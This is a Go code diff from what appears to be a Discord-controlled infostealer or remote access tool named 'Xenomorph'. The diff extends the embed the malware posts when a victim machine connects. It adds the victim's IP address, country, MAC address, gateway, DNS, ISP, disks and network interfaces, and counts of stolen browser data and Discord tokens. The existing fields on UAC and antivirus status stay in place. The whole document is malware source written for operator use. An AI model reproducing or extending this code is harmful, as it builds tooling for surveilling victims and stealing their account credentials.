@@ -12,9 +12,8 @@ func ConnectionEmbed(data *common.ClientData) discordgo.MessageEmbed {
 		Title: "Xenomorph **`[Connection]`**",
 		Fields: []*discordgo.MessageEmbedField{
 			{
-				Name:   "Computer Info",
-				Inline: true,
-				Value: "__**Computer Info**__\n" + Codeblock(DisplayFieldList([]Field{
+				Name: "__**Computer Info**__",
+				Value: Codeblock(DisplayFieldList([]Field{
 					{Name: "Computer Name", Value: data.ComputerName},
 					{Name: "Computer OS", Value: data.ComputerOS},
 					{Name: "Computer Version", Value: data.ComputerVersion},
@@ -25,6 +24,34 @@ func ConnectionEmbed(data *common.ClientData) discordgo.MessageEmbed {
 					{Name: "GPU", Value: data.GPU},
 					{Name: "UAC", Value: strconv.FormatBool(data.UAC)},
 					{Name: "Anti Virus", Value: data.AntiVirus},
+				})),
+			},
+			{
+				Name: "__**Network Info**__",
+				Value: Codeblock(DisplayFieldList([]Field{
+					{Name: "IP Address", Value: data.IPAddress},
+					{Name: "Country", Value: data.Country},
+					{Name: "Time Zone", Value: data.Timezone},
+					{Name: "MAC Address", Value: data.MACAddress},
+					{Name: "Gateway", Value: data.Gateway},
+					{Name: "Subnet Mask", Value: data.SubnetMask},
+					{Name: "DNS", Value: data.DNS},
+					{Name: "ISP", Value: data.ISP},
+				})),
+			},
+			{
+				Name:  "__**Disks**__",
+				Value: Codeblock(data.Disks),
+			},
+			{
+				Name:  "__**Network Interfaces**__",
+				Value: Codeblock(data.Wifi),
+			},
+			{
+				Name: "__**Apps**__",
+				Value: Codeblock(DisplayFieldList([]Field{
+					{Name: "Web Browsers", Value: strconv.Itoa(len(data.Webbrowsers))},
+					{Name: "Discord Tokens", Value: strconv.Itoa(len(data.DiscordTokens))},
 				})),
 			},
 		},
